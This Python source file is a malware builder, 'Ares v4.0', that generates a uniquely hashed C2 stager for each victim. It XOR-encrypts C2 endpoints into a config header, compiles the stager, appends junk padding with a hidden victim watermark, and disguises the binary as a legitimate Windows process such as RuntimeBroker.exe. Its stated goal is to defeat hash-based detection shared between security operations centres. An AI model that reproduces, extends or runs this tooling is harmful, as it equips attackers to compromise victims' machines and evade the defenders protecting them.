#!/usr/bin/env python3
"""
Ares v4.0 — Per-Victim Builder (Full Pipeline)

Generates a unique binary per victim with:
  - Unique XOR key (different encrypted strings per binary)
  - Unique PE timestamp
  - Unique junk padding (different SHA256 per binary)
  - Unique sleep jitter base
  - Unique User-Agent selection
  - Hidden watermark for victim attribution
  - Auto PE hardening (Rich strip, timestamp spoof, rename)

This means:
  SOC captures binary from Victim A → shares hash → DOES NOT match Victim B's binary.
  Every binary is a zero-day to every other SOC.

Usage:
  py tools/builder_v4.py --c2 c2.example.com --target VICTIM_01 --campaign OP_GHOST
  py tools/builder_v4.py --c2 c2.example.com --target VICTIM_02 --campaign OP_GHOST
  → Two different hashes, same C2, unique identifiers

Full pipeline mode (compile + harden):
  py tools/builder_v4.py --c2 c2.example.com --target VICTIM_01 --full-pipeline
"""

import argparse, hashlib, os, secrets, struct, sys, time, random
from datetime import datetime


def xor_encrypt(plaintext: str, key: int) -> list:
    """Rolling XOR — must match _xd() in ares_strings.h exactly.
    Key schedule: k[i] = key ^ ((i * 0x13 + 0x07) & 0xFF)"""
    result = []
    for i, b in enumerate(plaintext.encode('utf-8')):
        k = (key ^ ((i * 0x13 + 0x07) & 0xFF)) & 0xFF
        result.append(f"0x{(b ^ k):02X}")
    return result


def generate_watermark(target_name: str, campaign: str) -> bytes:
    """Generate a 16-byte watermark for victim attribution.

    Watermark is derived from target + campaign + timestamp.
    XOR'd into junk padding — looks random to analyst."""
    seed = f"{target_name}:{campaign}:{int(time.time())}"
    h = hashlib.sha256(seed.encode()).digest()
    return h[:16]


def generate_junk_padding(min_size: int = 32, max_size: int = 128) -> bytes:
    """Random junk bytes appended to binary to change SHA256."""
    size = random.randint(min_size, max_size)
    return secrets.token_bytes(size)


def generate_unique_config(c2_endpoints: list, c2_port: int, target_name: str,
                           campaign_name: str, sleep_ms: int, jitter_pct: int,
                           kill_date: str, ua_index: int, watermark: bytes) -> str:
    """Generate a unique ares_config.h per victim."""

    xor_key = secrets.randbelow(0xFE) + 1
    campaign_id = hashlib.sha256(campaign_name.encode()).hexdigest()[:16]
    target_id = hashlib.sha256(f"{target_name}:{campaign_name}".encode()).hexdigest()[:16]

    # Per-victim sleep jitter: +-20% of base
    unique_sleep = sleep_ms + random.randint(-sleep_ms // 5, sleep_ms // 5)
    unique_jitter = jitter_pct + random.randint(-5, 5)
    if unique_jitter < 10:
        unique_jitter = 10
    if unique_jitter > 50:
        unique_jitter = 50

    # Parse kill date
    kill_ts = 0
    if kill_date:
        try:
            dt = datetime.strptime(kill_date, "%Y-%m-%d")
            kill_ts = int(dt.timestamp())
        except ValueError:
            pass

    # Encrypt C2 endpoints
    eps = c2_endpoints[:4]
    c2_lines = []
    for i, ep in enumerate(eps):
        enc = xor_encrypt(ep, xor_key)
        hex_str = ", ".join(enc)
        c2_lines.append(f'static const BYTE CFG_C2_{i}[] = {{{hex_str}}};')
        c2_lines.append(f'#define CFG_C2_{i}_LEN {len(ep)}')
        c2_lines.append('')
    c2_block = "\n".join(c2_lines)

    # Watermark as hex array
    wm_hex = ", ".join(f"0x{b:02X}" for b in watermark)

    # Build macro
    macro_parts = ['#define ARES_DECODE_CONFIG(s) do {']
    for i in range(len(eps)):
        macro_parts.append(f'    _xd((s)->config.c2_endpoints[{i}], CFG_C2_{i}, CFG_C2_{i}_LEN, CFG_XOR_KEY);')
    macro_parts.append('    (s)->config.c2_count = CFG_C2_COUNT;')
    macro_parts.append('} while(0)')
    macro_result = []
    for i, part in enumerate(macro_parts):
        if i < len(macro_parts) - 1:
            macro_result.append(part + ' \\')
        else:
            macro_result.append(part)
    macro_block = "\n".join(macro_result)

    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    return f"""/*
 *  ARES AGENT -- Per-Victim Configuration (AUTO-GENERATED)
 *
 *  Campaign:  {campaign_name}
 *  Target:    {target_name}
 *  Target ID: {target_id}
 *  Generated: {now}
 *  XOR Key:   0x{xor_key:02X}
 *
 *  DO NOT EDIT -- regenerate with builder_v4.py
 */

#ifndef ARES_CONFIG_H
#define ARES_CONFIG_H

#include <windows.h>

#define CFG_CAMPAIGN_ID       "{campaign_id}"
#define CFG_TARGET_ID         "{target_id}"
#define CFG_XOR_KEY           0x{xor_key:02X}

#define CFG_SLEEP_MS          {unique_sleep}
#define CFG_JITTER_PCT        {unique_jitter}
#define CFG_KILL_DATE_TS      {kill_ts}

#define CFG_C2_PORT           {c2_port}
#define CFG_C2_COUNT          {len(eps)}
#define CFG_UA_INDEX          {ua_index}

/* Per-victim watermark (hidden in padding) */
static const BYTE CFG_WATERMARK[16] = {{{wm_hex}}};

/* Feature flags */
#define CFG_AUTO_STEAL        0
#define CFG_AUTO_PERSIST      0

{c2_block}
{macro_block}

#endif /* ARES_CONFIG_H */
"""


def append_junk_to_binary(binary_path: str, junk: bytes, watermark: bytes):
    """Append junk padding with embedded watermark to change SHA256."""
    with open(binary_path, 'ab') as f:
        # XOR watermark into junk at random offset
        junk = bytearray(junk)
        wm_offset = random.randint(0, max(0, len(junk) - 16))
        for i in range(min(16, len(junk) - wm_offset)):
            junk[wm_offset + i] ^= watermark[i]
        f.write(bytes(junk))


def main():
    parser = argparse.ArgumentParser(description='Ares v4.0 Per-Victim Builder')
    parser.add_argument('--c2', required=True, help='C2 endpoints (comma-separated)')
    parser.add_argument('--port', type=int, default=8443, help='C2 port')
    parser.add_argument('--target', required=True, help='Target/victim identifier')
    parser.add_argument('--campaign', default='DEFAULT', help='Campaign name')
    parser.add_argument('--sleep', type=int, default=10000, help='Base sleep ms')
    parser.add_argument('--jitter', type=int, default=30, help='Base jitter %%')
    parser.add_argument('--kill-date', default='', help='Kill date YYYY-MM-DD')
    parser.add_argument('--output-dir', default='build', help='Output directory')
    parser.add_argument('--config-only', action='store_true', help='Only generate config, do not compile')
    parser.add_argument('--full-pipeline', action='store_true',
                       help='Generate config + compile stager + harden PE')
    args = parser.parse_args()

    c2_list = [x.strip() for x in args.c2.split(',') if x.strip()]
    if not c2_list:
        print("[!] No C2 endpoints specified")
        sys.exit(1)

    # Per-victim UA index
    ua_index = hash(args.target) % 4

    # Generate watermark
    watermark = generate_watermark(args.target, args.campaign)

    print(f"\n{'='*55}")
    print(f"  Ares v4.0 Per-Victim Builder")
    print(f"{'='*55}")
    print(f"  Campaign: {args.campaign}")
    print(f"  Target:   {args.target}")
    print(f"  C2:       {', '.join(c2_list)}")
    print(f"  Port:     {args.port}")
    print(f"  UA Index: {ua_index}")
    print(f"  Watermark: {watermark.hex()[:16]}...")

    # Generate unique config
    config = generate_unique_config(
        c2_endpoints=c2_list, c2_port=args.port, target_name=args.target,
        campaign_name=args.campaign, sleep_ms=args.sleep, jitter_pct=args.jitter,
        kill_date=args.kill_date, ua_index=ua_index, watermark=watermark
    )

    # Write config
    config_path = os.path.join('agent', 'native', 'ares_config.h')
    os.makedirs(os.path.dirname(config_path), exist_ok=True)
    with open(config_path, 'w', encoding='utf-8') as f:
        f.write(config)
    print(f"  [+] Config: {config_path}")

    if args.config_only:
        print(f"\n  Config generated. Build with: make agent-stager")
        return

    if args.full_pipeline:
        import subprocess

        target_dir = os.path.join(args.output_dir, args.target)
        os.makedirs(target_dir, exist_ok=True)

        # Step 1: Compile stager
        print(f"\n  [1/4] Compiling stager...")
        result = subprocess.run(['make', 'agent-stager'], capture_output=True, text=True)
        if result.returncode != 0:
            print(f"  [!] Compile failed: {result.stderr}")
            sys.exit(1)
        print(f"  [+] Compiled: build/stager.exe")

        # Step 2: Append junk to change hash
        import shutil
        stager_src = os.path.join('build', 'stager.exe')
        stager_dst = os.path.join(target_dir, 'stager.exe')
        shutil.copy2(stager_src, stager_dst)
        junk = generate_junk_padding(64, 256)
        append_junk_to_binary(stager_dst, junk, watermark)
        print(f"  [2/4] Junk padding: +{len(junk)} bytes (unique hash)")

        # Step 3: PE hardening
        print(f"  [3/4] PE hardening...")
        # Pick random legitimate name
        legit_names = [
            "SearchHost.exe", "RuntimeBroker.exe", "SecurityHealthSystray.exe",
            "TextInputHost.exe", "backgroundTaskHost.exe", "CompPkgSrv.exe",
        ]
        out_name = random.choice(legit_names)
        out_path = os.path.join(target_dir, out_name)

        pe_spoof_cmd = [sys.executable, 'tools/pe_spoof.py', stager_dst, '-o', out_path]
        env = os.environ.copy()
        env['PYTHONIOENCODING'] = 'utf-8'
        result = subprocess.run(pe_spoof_cmd, capture_output=True, text=True, env=env)
        if result.returncode != 0:
            # Fallback: just rename
            shutil.move(stager_dst, out_path)
        else:
            os.remove(stager_dst)
        print(f"  [+] Hardened: {out_path}")

        # Step 4: Generate SHA256
        with open(out_path, 'rb') as f:
            sha256 = hashlib.sha256(f.read()).hexdigest()
        size_kb = os.path.getsize(out_path) / 1024

        print(f"\n  [4/4] Manifest:")
        print(f"  {'='*55}")
        print(f"  Target:   {args.target}")
        print(f"  File:     {out_name}")
        print(f"  Size:     {size_kb:.1f} KB")
        print(f"  SHA256:   {sha256}")
        print(f"  Path:     {out_path}")
        print(f"  {'='*55}")

        # Write manifest
        manifest_path = os.path.join(target_dir, 'manifest.txt')
        with open(manifest_path, 'w') as f:
            f.write(f"Target: {args.target}\n")
            f.write(f"Campaign: {args.campaign}\n")
            f.write(f"File: {out_name}\n")
            f.write(f"SHA256: {sha256}\n")
            f.write(f"Size: {size_kb:.1f} KB\n")
            f.write(f"C2: {', '.join(c2_list)}\n")
            f.write(f"Port: {args.port}\n")
            f.write(f"Generated: {datetime.now().isoformat()}\n")
            f.write(f"Watermark: {watermark.hex()}\n")
        print(f"  [+] Manifest: {manifest_path}")
    else:
        print(f"\n  Config generated. Build with: make agent-stager")
        print(f"  Or use --full-pipeline for automated build+harden")


if __name__ == '__main__':
    main()
